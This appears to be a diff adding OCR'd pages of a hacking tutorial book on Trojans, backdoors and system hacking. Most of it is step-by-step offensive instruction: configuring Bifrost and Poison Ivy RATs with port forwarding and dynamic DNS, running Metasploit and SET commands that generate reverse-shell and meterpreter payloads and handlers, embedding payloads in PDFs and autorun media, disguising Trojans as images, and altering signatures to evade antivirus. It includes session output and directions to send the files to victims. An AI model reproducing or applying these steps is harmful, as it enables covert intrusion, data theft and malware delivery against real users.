@@ -1,0 +1,5376 @@
+- img_proc: true
+  md: '# # COMMON WINDOWS, LINUX AND WEB SERVER SYSTEMS HACKING TECHNIQUES
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_0_0.png)
+
+
+    DR. HIDAIA MAHMOOD ALASSOULI'
+  merge: -1
+  pgno: 0
+- img_proc: true
+  md: '# Common Windows, Linux and Web Server Systems
+
+    Hacking Techniques
+
+
+    By
+
+
+    Dr. Hidaia Mahmood Alassouli
+
+    Hidaia_alassouli@hotmail.com'
+  merge: -1
+  pgno: 1
+- img_proc: true
+  md: '# # 1. Introduction
+
+
+    Trojan horse or Trojan is a type of malware that is often disguised as legitimate
+    software. Trojans can be employed by cyber-thieves and hackers trying to gain
+    access to users'' systems. Users are typically tricked by some of social engineering
+    into loading and executing Trojans on their systems. Once activated, Trojans enable
+    cyber-criminals to spy on you, steal your sensitive data, and gain backdoor access
+    to your system.
+
+
+    A computer virus is a type of computer program that, when executed, replicates
+    itself by modifying other computer programs and inserting its own code. If this
+    replication succeeds, the affected areas are then said to be "infected" with a
+    computer virus. Computer viruses generally require a host program.
+
+
+    System hacking is defined as the compromise of computer systems and software to
+    access the target computer and steal or misuse their sensitive information. The
+    malicious hacker exploits the weaknesses in a computer system or network to gain
+    unauthorized access to its data or take illegal advantage.
+
+
+    Web content is generated in real time by a software application running at server-side.
+    So hackers attack on the web server to steal credential information, passwords,
+    and business information by using DoS (DDoS) attacks, SYN flood, ping flood, port
+    flood scan, sniffing attacks, and social engineering attacks.
+
+
+    This report covers the common techniques and tools used for Systems, Windows,
+    Linux and Web Server Hacking. The report contains from the following:
+
+
+    +   * Part A: Setup Lab
+
+    * Part B: Trojans and Backdoors and Viruses
+
+    * Part C: System Hacking
+
+    * Part D: Hacking Web Servers
+
+    * Part E: Windows and Linux Hacking
+
+
+    You can download all hacking tools and materials from the following websites
+
+
+    http://www.hxf4rall.com/2016/02/13/ceh-v9-pdf-certified-ethical-hacker-v9-courseeducational-materials-tools/
+
+
+    www.mediafire.com%2FFolder%2Fad5szsted5end%2FEduors_Professional_Ethical_Hacker&h=gAQGad5Hf'
+  merge: -1
+  pgno: 2
+- img_proc: true
+  md: '# 2. Part A: Setup Lab
+
+
+    +   - From the virtualization technology with software VMware or virtual box we
+    can do more than one virtual machines, linux and other windows 2007 or windows
+    Xp
+
+    - Download vmware and install it
+
+    - Create folder edors-vm in in non-windows partition. Create a folder for each
+    operating system
+
+    - Install any windows operating system.
+
+    - Download backtrack
+
+
+    # a) Setup Lab
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_3_0.png)
+
+
+    +   - To install backtrack on usb, download unbootee. We need also to use the
+    tool to support booting from flash memory in vm.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_3_1.png)
+
+
+    +   - Download and install kali linux
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_3_2.png)
+
+
+    +   - Download and install metasploit.'
+  merge: -1
+  pgno: 3
+- img_proc: true
+  md: '![](img/91b4da451291288ee84ff207e23ccb97_4_0.png)
+
+
+    Metasploit is big project that contains a lot of modules or programs. These modules
+    or programs can utilize the holes in windows machines or linux machines operating
+    systems. For any hole that occur in the operating systems, we can develop the
+    program that can utilize this hole. We can work on it through command line or
+    graphical interface. The programs that use graphical interface are armitage and
+    Koblet Strike . In linux we can update the metasploite using command msfupdate.'
+  merge: -1
+  pgno: 4
+- img_proc: true
+  md: '# 2. Part B: Trojans and Backdoors and Viruses
+
+
+    # a) Backdoors
+
+
+    # What is Backdoors ?
+
+
+    - A backdoor is a means of access to a computer program that bypasses security
+    mechanisms. A programmer may sometimes install a backdoor so for troubleshooting
+    or other purposes. However, attackers often use backdoors that they detect or
+    install themselves
+
+
+    - A backdoor is a program or a set of related programs that a hacker installs
+    on a target system to allow access to the system at a later time. A backdoor''s
+    goal is to remove the evidence of initial entry from the system''s log files.
+    But a backdoor may also let a hacker retain access to a machine it has penetrated
+    even if the intrusion has already been detected and remedied by the system administrator.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_5_0.png)
+
+
+    The backdoor is the backdoor that through it we can make access on the machine
+    and we can make bypass to the existing security policies. Microsoft has backdoors
+    that enables it to make remote access to the machine.'
+  merge: -1
+  pgno: 5
+- img_proc: true
+  md: '# b) Torjen Horse:
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_6_0.png)
+
+
+    Trojan horse is a good program that carries bad program. When the client download
+    the good program, it will download with the trojan program also so the hacker
+    can access the machine.'
+  merge: -1
+  pgno: 6
+- img_proc: true
+  md: '# What Is Meant by Overt and Covert Channels?
+
+
+    An overt channel is the normal and a legitimate way that programs communicate
+    with a computer system or network. A covert channel uses programs or communications
+    paths in ways that were not intended.
+
+
+    Trojans can use covert channels to communicate. Some client Trojans use covert
+    channels to send instructions to the server component on the compromised system.
+    This sometimes makes Trojan communication difficult to decipher and understand.
+
+
+    Covert channels rely on a technique called tunneling, which lets one protocol
+    be carried over another protocol. Internet Control Message Protocol (ICMP) tunneling
+    is a method of using ICMP echo-request and echo-reply to carry any payload an
+    attacker may wish to use, in an attempt to stealthily access or control a compromised
+    system.
+
+
+    The overt channel means that any program when run makes for it channel between
+    it and the system. The covert channel means that the program will use the channel
+    in the wrong direction to access the machine.'
+  merge: -1
+  pgno: 7
+- img_proc: true
+  md: '# List the Different Types of Trojans
+
+
+    Trojans can be created and used to perform different attacks. Some of the most
+    common types of Trojans are:
+
+
+    +   - Remote Access Trojans (RATs)—used to gain remote access to a system
+
+
+    +   - Data-Sending Trojans—used to find data on a system and deliver data to a
+    hacker
+
+
+    +   - Destructive Trojans—used to delete or corrupt files on a system
+
+
+    +   - Denial of Service Trojans—used to launch a denial or service attack
+
+
+    +   - Proxy Trojans—used to tunnel traffic or launch hacking attacks via other
+    system
+
+
+    +   - FTP Trojans—used to create an FTP server in order to copy files onto a system
+
+
+    +   - Security software disabler Trojans—used to stop antivirus software'
+  merge: -1
+  pgno: 8
+- img_proc: true
+  md: '# How Do Reverse Connecting Trojans :
+
+
+    Trojan in the hacker computer which creates server installed in the client computer.
+    The reverse connection, the technique on the client computer will make connection
+    to the Trojan program on the hacker machine. We have problem that the hacker needs
+    constant real ip that does not.
+
+
+    # How Reverse-Connecting Trojans Work?
+
+
+    Reverse-connecting Trojans let an attacker access a machine on the internal network
+    from the outside. The hacker can install a simple Trojan program on the system
+    on the internal network, such as the reverse WWW shell. On a regular basis (usually
+    every 60 seconds), the internal server tries to access the external master system
+    to pick up commands. If the attacker has typed something into the master system,
+    this command is retrieved and executed on the internal system. Reverse WWW shell
+    uses standard HTTP. It is dangerous because it is difficult to detect-it looks
+    like a client is browsing the Web from the internal network.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_9_0.png)
+
+
+    +   - Windows Trojans Are Built and Poisoned by
+
+    - We must make port forward and dynamic dns. Go to basics then nat in the router
+    configuration window. Choose the start and end port number and the internal ip
+    of the hacker computer. We need to make the ip of the hacker computer static and
+    same as the ip in the router configuration. If the router will make connection
+    to the router at port 81, it must forward the hacker computer with the internal
+    ip 192.168.1.150 at port 81.
+
+    - The problem of the real ip is not constant and changing. One solution that we
+    buy is dynamic dns. To get real ip, we need to have phone it. Another solution
+    is to register your domain name in dns server. This domain name will point to
+    the ip of the router. If the real ip changes, the router will change the data
+    in the dynamic dns server. The client Trojan will make connection with the dynamic
+    dns server and tell it the real ip of the router. So the Trojan will make connection
+    to the router at the port given in the Trojan program at hacker computer.
+
+
+    # NAT - Virtual Server
+
+
+    | Virtual Server for | PVC0 - Multiple IP Account |
+
+    |---|---|
+
+    | Rule Index | 1 |
+
+    | Application | Bifrost |
+
+    | Protocol | ALL |
+
+    | Start Port Number | 81 |
+
+    | End Port Number | 81 |
+
+    | Local IP Address | 192.168.1.150 |
+
+    | Start(Local) | 81 |
+
+    | End Port(Local) | 81 |
+
+
+    # Virtual Server Listing
+
+
+    | Rule | Application | Protocol | Start Port | End Port | Local IP Address | Start
+    Port(Local) | End Port(Local) |
+
+    |---|---|---|---|---|---|---|--|
+
+    | 1 | Bifrost | ALL | 81 | 81 | 192.168.1.150 | 81 | 81 |
+
+    | 2 | Poison | ALL | 3460 | 3460 | 192.168.1.150 | 3460 | 3460 |
+
+
+    +   - The site no-ip can provide dynamic dns. Register, then add host.
+
+    - Download and setup the no-ip program at hacker computer.'
+  merge: -1
+  pgno: 9
+- img_proc: true
+  md: '# DUC v4.0.1
+
+
+    File Edit Tools Help
+
+
+    Status
+
+    Client ID: C3A9845233
+
+    demoairdagon@hotmail.com
+
+
+    Updating: 0 Groups & 1 hosts
+
+    IP: 41.32.91.242
+
+    Next Check: In 56s
+
+
+    6:56 PM: Remote IP Found: 41.32.91.242
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_10_0.png)
+
+
+    Please select the hosts or groups to be associated with this client. You can click
+    here to add or remove hosts within your account on the No-IP.com website.
+
+
+    Manage Existing Hosts  Create Hosts..
+
+
+    zapto.org
+
+    demoairdagon.zapto.org
+
+
+    Show selected hosts
+
+
+    Require a password to modify hosts
+
+
+    +   * You can utilize a property in routers called dynamic dns
+
+
+    | Dynamic DNS | |
+
+    |---|---|
+
+    | Active | Enable Disable |
+
+    | Service Provider | |
+
+    | Host Name | |
+
+    | E-mail Address | |
+
+    | User | |
+
+    | Password | |
+
+    | Enable Wizard | Enable Disable |
+
+
+    +   * Register for account in dynamicdns.com and put the registration information
+    in the router configuration. When the router restarts, it will register its ip
+    in dynamic dns.
+
+    * We can use VPS machine. VPS will have real IP and it is advice connected directly
+    to internet and we we put it through Trojan program. The Trojan server in the
+    client will make reverse connection to this real IP so the real IP will not change
+    and VPS up in 24hrs.'
+  merge: -1
+  pgno: 10
+- img_proc: true
+  md: '# f) Windows Torjan Tools :
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_11_0.png)
+
+
+    +   - Download bifrost. The bifrost has small size and encryption in many ways.
+    Make registration.
+
+    - Make the port forward at the router.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_11_1.png)
+
+
+    +   - Then go bifrost stub customize and generate the trojan with the following
+    settings. The file generated will be Customized.'
+  merge: -1
+  pgno: 11
+- img_proc: true
+  md: '![](img/91b4da451291288ee84ff207e23ccb97_12_0.png)
+
+
+    +   - Open the program bifrost. Put the dynamic dns name and the port number the
+    Trojan program will work.'
+  merge: -1
+  pgno: 12
+- img_proc: true
+  md: '![](img/91b4da451291288ee84ff207e23ccb97_13_0.png)
+
+
+    +   - We customize the file in the machine we want to attack and we can browse
+    the machine
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_13_1.png)
+
+
+    +   - Build the program. Give him the file output of the customizer Customized.
+
+    - Send the file to the client you want to hack.
+
+    - When the client access the Trojan file, we will get notice of reverse connection'
+  merge: -1
+  pgno: 13
+- img_proc: true
+  md: '![](img/91b4da451291288ee84ff207e23ccb97_14_0.png)
+
+
+    +   - Choose file manager on the machine you received
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_14_1.png)
+
+
+    +   - Another program is Poison program
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_14_2.png)
+
+
+    +   - Choose new client. The Trojan program listens on. Put the password for the
+    reverse connection if you wish.'
+  merge: -1
+  pgno: 14
+- img_proc: true
+  md: '+   • The new server creates profile and name after you generate it. Choose
+    the reverse connection to come to the dynamic dns server.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_15_0.png)
+
+
+    +   • When the client clicks on server, we can see all information
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_15_1.png)
+
+
+    +   • Generate it and name server.
+
+    • When the client access the file, we get in the hacker client application the
+    following
+
+
+    Professional Ethical Hacker (Trojans Backdoors Vulnerabilities Part 1) By Eng.Mahmoud
+    Ahmed - Arabic-1
+
+
+    | ID | WLAN | LAN | Conn. Type | Computer | Use Name | Acc | OS | CPU | RAM |
+    Version | Ping | Created |
+
+    |---|---|---|---|---|---|---|---|---|---|---|---||
+
+    | 1 | 192.16... | 192.16... | Direct | XP-1 | user | Admin | WinV6 | 2495 MHz
+    | 511.48 MB | 2.3 | 1/12/2013 4:33:54 |
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_15_2.png)'
+  merge: -1
+  pgno: 15
+- img_proc: true
+  md: <!-- no content -->
+  merge: -1
+  pgno: 16
+- img_proc: true
+  md: '# g) Linux Trojan Tools :
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_17_0.png)
+
+
+    +   - VPS is a machine that has real ip address. We can connect on it in Windows
+    from remote desktop and Linux from SSH or through VNC program or through Cpanel
+    of the company you bought from it the VPS .
+
+
+    | Linux VPS Plans | Windows VPS Plans | Linux VPS Pro |
+
+    | --- | --- | --- |
+
+    | Linux VPS Plus | 30 GB Disk Space | 50 GB Disk Space |
+
+    | | 1024 MB RAM | 2048 MB RAM |
+
+    | | 4096 MB Burst RAM | 6144 MB Burst RAM |
+
+    | | Unmetered Bandwidth | Unmetered Bandwidth |
+
+    | | Equal CPU (1 core min.) | Equal CPU (2 core min.) |
+
+    | From $19.95 ORDER NOW | From $29.95 ORDER NOW |'
+  merge: -1
+  pgno: 17
+- img_proc: true
+  md: '# h) Installing Metasploit:
+
+
+    +   - Download Metasolit. You will get the following file.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_18_0.png)
+
+
+    +   - Give the file executable permission to be executable. Run the file.
+
+
+    ```
+
+    root@mahmoud-virtual-machine:~/Desktop# chmod +x metasploit-latest-linux-installer.run
+
+    root@mahmoud-virtual-machine:~/Desktop# ./metasploit-latest-linux-installer.run
+
+    ```
+
+
+    +   - Setup the program. Leave the default information
+
+    - To update, you will need to make registration. You need to access the metasploit
+    through the web browser
+
+    http://localhost:1790/ Fill the information
+
+
+    | Login Info | |
+
+    |---|---|
+
+    | Username* | |
+
+    | Password* | |
+
+    | Password confirmation* | |
+
+    | Optional Info & Settings | |
+
+    | Full name | |
+
+    | Email address | |
+
+    | Organization | |
+
+    | Time zone (GMT+02:00) Athens) | |
+
+
+    +   - Tell him to choose the pro metasploit standard edition. Give him the necessary
+    information
+
+
+    | Register & Get Your Free Metasploit Pro Trial Product Key | |
+
+    |---|---|
+
+    | Denotes mandatory fields. | |
+
+    | * First Name | |
+
+    | * Last Name | |
+
+    | Job Title | |
+
+    | * Company Name | |
+
+    | * Country United States |
+
+    | State/Province Please Select |
+
+    | * Type of Use Please Select |
+
+    | * Work Phone | |
+
+    | Work Email | |
+
+    | No free mail or ISP Addresses |
+
+
+    +   - You will get license key in email and you will put it in the metasploit
+    activation.
+
+    - You will get the following interface'
+  merge: -1
+  pgno: 18
+- img_proc: true
+  md: '# Activation Successful
+
+
+    Quick Start Wizards
+
+    What do you want to do?
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_19_0.png)
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_19_1.png)
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_19_2.png)
+
+
+    # Project Listing
+
+
+    +   - Update the metasploit.'
+  merge: -1
+  pgno: 19
+- img_proc: true
+  md: '![](img/91b4da451291288ee84ff207e23ccb97_20_0.png)
+
+
+    The payload is program through which we can utilise vulnerability on some software
+    so we can access the machine. Metasploit has big number of payload for different
+    types of operating systems and programs.
+
+
+    +   * To see all types of payloads
+
+
+    # msfconsole
+
+
+    Msf> we want to create payload that will work in windows machine and this type
+    will be shell code and we use the property reverse connection
+
+
+    +   * we want to create payload that will work in windows machine and this type
+    will be shell code and we use the property reverse connection
+
+
+    Msf> search payload/windows/shell/reverse_tcp
+
+
+    Msf> set LHOST 192.168.52.130 (The ip of hacker machine)
+
+
+    Msf> generate -f server -exe
+
+
+    It will create server.exe in the root
+
+
+    +   * Use the multi handler to listen for the payload.
+
+
+    Msf > back
+
+
+    Msf> use exploit/multi/handler
+
+
+    Msf>set payload windows/shell/reverse_tcp
+
+
+    Msf> set LHOST 192.168.52.130 ( the hacker ip)
+
+
+    Msf> set LPORT 4444
+
+
+    Msf> exploit -j
+
+
+    Msf > sessions -l (to see the sessions)
+
+
+    Msf > sessions -i 2
+
+
+    +   * You can do anything in machine'
+  merge: -1
+  pgno: 20
+- img_proc: true
+  md: "```\nsf exploit(handler) > [Starting the payload handler...]\n[*] Command session\
+    \ opened 2 (41.32.91.242:4444 -> 192.168.1.7:491) at 23-07-18 03:08:57 +0200\n\
+    sf exploit(handler) > sessions -l\n============================\nId Type Information\n\
+    \     Connection\n2 shell windows Microsoft Windows [Version 6.1.76601] Copyright\
+    \ (c) 2009 Mic\nsoft Corporation... - 41.32.91.242:4444 -> 192.168.1.7:497 (192.168.1.7)\n\
+    sf exploit(handler) > sessions -l\n[*] Starting interaction with 2...\nMicrosoft\
+    \ Windows [Version 6.1.76601]\ncopyright (c) 2009 Microsoft Corporation. All rights\
+    \ reserved.\nC:\\Users\\Desktop>dir\n```\n\n+   - You can create the payload directly\n\
+    \n```\nmahmoud@mahmoud-virtual-machine:-$ sudo msfpayload payload/windows/shell_reverse_tcp\t\
+    TCP LHOST 41.32.91.242 LPORT 4444 R=eduoders.exe\n[sudo] password for mahmoud:\n\
+    Invalid payload: payload/windows/shell_reverse_tcp\nmahmoud@mahmoud-virtual-machine:-$\
+    \ $\n- You can use the tool to create payloads. It works with metasploit.\n```\n\
+    \nGo applications, exploitation tools, social engineering tools, social engineering\
+    \ toolkit, set\n\n```\nSet>set-toolkit\n```\n\n```\nSet >se_toolkit\n```\n\nPress\
+    \ 1 for social engineering attacks.\n\n![](img/91b4da451291288ee84ff207e23ccb97_21_0.png)\n\
+    \nPress 4 for create a payload and listener"
+  merge: -1
+  pgno: 21
+- img_proc: true
+  md: '+   1) Spear-Phishing Attack Vectors
+
+    2) Website Attack Vectors
+
+    3) Infectious Media Generator
+
+    4) Create a Payload and Listener
+
+    5) Ms Malware Attacker
+
+    6) Arduino Based Attack Vector
+
+    7) SMS Spoofing Attack Vector
+
+    8) Wireless Access Point Attack Vector
+
+    9) QRCode Generator Attack Vector
+
+    10) PowerShell Attack Vectors
+
+    11) Third Party Modules
+
+
+    99) Return back to the main menu.
+
+
+    Then, you put in the ip of the hacker computer that will listen to the payload.
+
+
+    Choose for the payload windows/shell/reverse_tcp payload
+
+
+    Choose to use encoding
+
+
+    Choose to listen at port 4444
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_22_0.png)
+
+
+    ```
+
+    set:encoding>1
+
+    set:payloads> PORT of the listener [443]:4444
+
+    ```
+
+
+    +   * It will ask you if you want to operate the listener, tell him yes.
+
+    * You can find the payloads in pentest/exploits/set/msf.exe
+
+    * Run the payload at client computer. The shell code sessions will appear at the
+    hacker computer.
+
+
+    Set > sessions -l (to see the sessions)
+
+
+    Set > sessions -i 1'
+  merge: -1
+  pgno: 22
+- img_proc: true
+  md: '# j) Wrapping:
+
+
+    It is to merge the program with picture so that the client will not suspect the
+    Trojan.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_23_0.png)
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_23_1.png)
+
+
+    +   - In Bifrost create server.
+
+    - Use the unicast sfx compiler to merge the torjan and a picture'
+  merge: -1
+  pgno: 23
+- img_proc: true
+  md: '![](img/91b4da451291288ee84ff207e23ccb97_24_0.png)
+
+
+    +   - You can use kabo icon changer to change the icon
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_24_1.png)
+
+
+    +   - You can use also winrar or iexpress'
+  merge: -1
+  pgno: 24
+- img_proc: true
+  md: "# Wrapping by Metasploit\n\n```\nmsfconsole\\use exploit/windows/fileformat/adobe_pdf_embedded_exe\n\
+    set payload windows/meterpreter/reverse_tcp\nset LHOST 192.168.28.133\nset LPORT\
+    \ 4444\nset FILENAME eduors.pdf\nset INFILENAME /root/CEI.pdf\noutput file /root/msf4/data/exploits/eduors.pdf\n\
+    \nblah Multihandler\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\n\
+    set LHOST 192.168.28.133\nset LPORT 4444\nexploit -j\n```\n\n+   - Use the following:\n\
+    \  `use exploit/windows/fileformat/adobe_pdf_embedded_exe`\n- Generate the payload\
+    \ in msfconsole. Give the LHOST the hacker computer dns name, the LPORT we want\
+    \ the Trojan port to listen, the pdf file we want to merge with the payload.\n\
+    \n```\nmsf exploit/windows/fileformat/adobe_pdf embedded.exe\nmsf exploit(adobe_pdf_embedded_exe)\
+    \ > set payload windows/meterpreter/reverse\nppayload => windows/meterpreter/reverse_tcp\n\
+    msf exploit(adobe_pdf_embedded_exe) > set LHOST 192.168.28.133\nmsf exploit(adobe_pdf_embedded_exe)\
+    \ > set LPORT 4444\nmsf exploit(adobe_pdf_embedded_exe) > set FILENAME eduors.pdf\n\
+    msf exploit(adobe_pdf_embedded_exe) > set INFILENAME '/root/CEI.pdf'\nmsf exploit(adobe_pdf_embedded_exe)\
+    \ > exploit\n\n[*] Reading in '/root/CEI.pdf'...\n[*] Parsing '/root/CEI.pdf'...\n\
+    [*] Parsing Success! \n[*] Using windows/meterpreter/reverse_tcp as payload ...\n\
+    [*] Creating 'eduors.pdf' file...\n[*] Generated output file /root/msf4/data/exploits/eduors.pdf\n\
+    msf! exploit(adobe_pdf_embedded_exe) >\n```\n\n+   - Run the multi handler. Give\
+    \ it the payload information. Infect the client with the pdf file and you will\
+    \ enter metpreter session."
+  merge: -1
+  pgno: 25
+- img_proc: true
+  md: "```\nnsf exploit(handler) > use exploit/multi/handler\nsf exploit(handler)\
+    \ > set payload windows/meterpreter/reverse_tcp\npayload = windows/meterpreter/reverse_tcp\n\
+    sf exploit(handler) > set LHOST 192.168.28.133\nLHOST = 192.168.28.133\nsf exploit(handler)\
+    \ > set LPORT 4444\nPORT = 4444\nsf exploit(handler) > exit\nsexited\nsf exploit(handler)\
+    \ > exploit -j\n[*] Running exploit as background job.\n[*] Starting the payload\
+    \ handler... reverse handler on 192.168.28.133:4444\n```\n\nStarting stage (752128\
+    \ bytes) to 192.168.28.138\n[*] Session opened for 192.168.28.133:4444 <- 192.168.28.137:10673\n\
+    2013-07-27 19:35:56 -0400\n\nnsf exploit(handler) > sessions -\nActive sessions\n\
+    \n| Id Type Information Connection |\n| 1 meterpreter/win/x32 XP-user@XP-1 192.168.28.133:4444\
+    \ -> 192.168.28.138:10673 |\n\nnsf exploit(handler) > sessions - 1\nStarting interaction\
+    \ with 1...\n\n+   * Wrapping by Set Tools:\n  #./se-toolkit\n* Choose 1 If for\
+    \ social engineering attack.\n\n![](img/91b4da451291288ee84ff207e23ccb97_26_0.png)\n\
+    \n+   * Choose 3 for infection media generator.\n\n![](img/91b4da451291288ee84ff207e23ccb97_26_1.png)"
+  merge: -1
+  pgno: 26
+- img_proc: true
+  md: '+   - Choose for 1 file-format exploits.
+
+
+    The Infectious USB/CD/DVD media will create an autorun.inf file and a Metasploit
+    payload. When the DVD/USB/CD is inserted, it will automatically run if autorun
+    is enabled.
+
+
+    Pick the attack vector you wish to use: fileformat bugs or a straight exploit.
+
+
+    +   1) File-Format Exploits
+
+    2) Standard Metasploit Executable
+
+    99) Return to Main Menu
+
+
+    set:infectious>
+
+
+    +   - Put the IP that the payload uses for the reverse connection.
+
+    - Choose 11 for embedded pdf exe social engineering.
+
+
+    ```
+
+    root@bt: /pentest/exploits/set
+
+    File Edit View Terminal Help
+
+    *********************************** PAYLOADS **********************************
+
+    1) SET CUSTOM Written DLM Hijacking Attack Vector (RAM, ZIP)
+
+    2) SET CUSTOM Written DOCUMENT CustomSizedDBSECTION Stack Buffer Overflow
+
+    3) Microsoft Word RTF pfragments Stack Buffer Overflow (MS10-087)
+
+    4) Adobe Flash Player "Button" Memory Code Execution
+
+    5) Adobe Coltype Style Launcher Memory Buffer Overflow
+
+    6) Adobe Flash Player "function" Invalid Pointer Counter
+
+    7) Adobe Collab.call.BufferOverflow
+
+    8) Adobe Collab.get.executeBufferOverflow
+
+    9) AB2JIG2Decode Memory Corruption Exploit
+
+    10) Embedded PDF EXE Social Engineering
+
+    11) Adobe util.print() Buffer Overflow
+
+    12) CUSTOM EXE v6.01 Shellcode (RAR REQUIRED)
+
+    13) U30 CLODProgresiveDeclaration Array Overflow
+
+    14) Adobe PDF EXE Social Engineering (NOJS5)
+
+    15) PDF-Reader v8.0.1 Stack Buffer Overflow
+
+    16) Apple QuickTime PCNT Size Buffer Overflow
+
+    17) Nuance PDF Reader v0.8 Launcher Stack Buffer Overflow
+
+    18) Adobe Reader u30 Memory Corruption Vulnerability
+
+    19) MS0CMCTLX Buffer Overflow (ms12-92cf).
+
+    ```
+
+
+    +   - Choose the type of payload to be 2, windows metpreter reverse/set
+
+
+    ```
+
+    root@bt: /pentest/exploits/set
+
+    - Default payload creation selected. SET will generate a normal PDF with embedded
+    EXE.
+
+    set:payloads>2
+
+    1) Use your own PDF for attack
+
+    2) Built-in BLANK PDF for attack
+
+    1) Windows Reverse TCP Shell spawning command shell on send to attacker
+
+    2) Windows Metpreter Reverse TCP spawning a metpreter shell on victim and send
+    back to attacker
+
+    3) Windows Reverse VNC DLL spawning a VNC server on victim and send back to attacker
+
+    4) Windows Reverse TCP Shell (X64) Windows X64 Command Shell, Reverse Inline
+
+    5) Windows Metpreter Reverse TCP (X64) connect back to the attacker (Windows X64)
+
+    6) Shell Blind TCP (X64) execute and create an access import port system remote
+
+    7) Windows Metpreter Reverse HTTPS Tunnel communication over HTTP SSL and use
+    Metpreter
+
+    ```
+
+
+    +   - Put the IP of the listener and the port number.'
+  merge: -1
+  pgno: 27
+- img_proc: true
+  md: "```\nset:payload=> \nset:IP address for the payload listener: 192.168.28.133\n\
+    set:port=> Port to connect back on: [4444]\n[*] Generating exploit file...\n[*]\
+    \ All payloads get sent to: /root/set/template.pdf directory\n[*] Your attack\
+    \ has been created in the SET home directory folder 'autorun'\n[*] Copy the contents\
+    \ of the folder to CD/DVD/USB to autorun\n[*] Create a listener right now [yes|no]:\n\
+    ```\n\n+   - You will find the file in /root/pentest/exploits/autorun/template.pdf\
+    \ and there is autorun.inf.\n- Take the file in client computer and run it. The\
+    \ meterpreter session opens.\n\n```\n[+] processing /root/set/meta_config for\
+    \ ENB directives.\nresources=/root/meterpreter/handler\nnpayload=windows/meterpreter/reverse_tcp\n\
+    host=192.168.28.133\nport=4444\n[*] exploit -r /root/set/meta_config - \n[*] Exploit\
+    \ running as background job.\n[*] Meterpreter handler started on 192.168.28.133:4444\n\
+    [*] Meterpreter session 1 opened (192.168.28.133:4444) -> 192.168.28.138:1048)\n\
+    2013-10-27 10:00:00 [meterpreter] exploit(handler)\nmeterpreter> sessions -l 1\n\
+    meterpreter> Starting interaction with 1...\n```"
+  merge: -1
+  pgno: 28
+- img_proc: true
+  md: '# 1) Wrapping Using Linux:
+
+
+    +   - The cobalt strike is better than armitage in the point that it can do wrapping.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_29_0.png)
+
+
+    +   - Generate exe file. Search for windows/meterpreter/reverse_tcp payload. Put
+    the ip and port and no of the listener.
+
+    - Generate exe file.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_29_1.png)'
+  merge: -1
+  pgno: 29
+- img_proc: true
+  md: '![](img/91b4da451291288ee84ff207e23ccb97_30_0.png)
+
+
+    +   - To work in multi handler, choose the same payload and put the same ip and
+    no of the listener. Choose the output to be multi handler.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_30_1.png)
+
+
+    +   - To merge with pdf file, go menu, attacks, packages, adobe pdf. Choose the
+    pdf file and the server file.'
+  merge: -1
+  pgno: 30
+- img_proc: true
+  md: '![](img/91b4da451291288ee84ff207e23ccb97_31_0.png)
+
+
+    +   - When you run the infected file in the client machine you will see it
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_31_1.png)
+
+
+    # Priv: Password database Commands
+
+
+    | Command | Description |
+
+    | --- | --- |
+
+    | hashdump | Dumps the contents of the SAM database |'
+  merge: -1
+  pgno: 31
+- img_proc: true
+  md: '# m) Encoding the Trojan so the anti-virus will not detect it:
+
+
+    Understand How Enc Trojan
+
+    We need encrypt Trojan because antivirus can detect server and stop process
+
+    Used more techniques for encrypt server but not required you have knowledge
+
+    for assembly or c++ or vb programming language
+
+    antivirus detect malware: Signature based and behavioral based
+
+
+    You can scan server by Free Online Mult Antivirus File and URL
+
+    http://novirusthanks.org/
+
+    https://www.virustotal.com/en/
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_32_0.png)
+
+
+    Windows tools
+
+    Xenocode_Postbuild
+
+    Hex Workshop
+
+    Encoding Payloads By Metasploit
+
+    Msfconsole
+
+    Set
+
+    Cobalt strike and armitage
+
+
+    +   - The trojan wants to detect any virus or malware or Trojan, it can work through
+    two ways, signature based or behavioral based. The anti virus program has a database
+    that has a lot of codes and when it finds the code in the file scans, it will
+    know that it is Trojan with some name or virus with some name. The behavioral
+    based can see the behavior of the program when it run. From the behavior of the
+    program it can detect whether it is virus or Trojan. Most programs work as signature
+    based and some works as behavioral based.
+
+    - There are some sites that have mute engine virus scan that can scan any file
+    with many viruses. Virustotal.com can scan with 46 engines.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_32_1.png)
+
+
+    +   - You can encrypt the Trojan and scan it in virustotal.com, but that make
+    the antiviruses detect your Trojan from virustotal.com.
+
+    - Encode the program customized.exe with xencode program.'
+  merge: -1
+  pgno: 32
+- img_proc: true
+  md: '![](img/91b4da451291288ee84ff207e23ccb97_33_0.png)
+
+
+    +   - You can encrypt the file using hex workshop program. Search by trial error
+    the part that has virus signature and change a letter on it so the file will not
+    be detected by antivirus.'
+  merge: -1
+  pgno: 33
+- img_proc: true
+  md: '# n) Encoding in Metasploit
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_34_0.png)
+
+
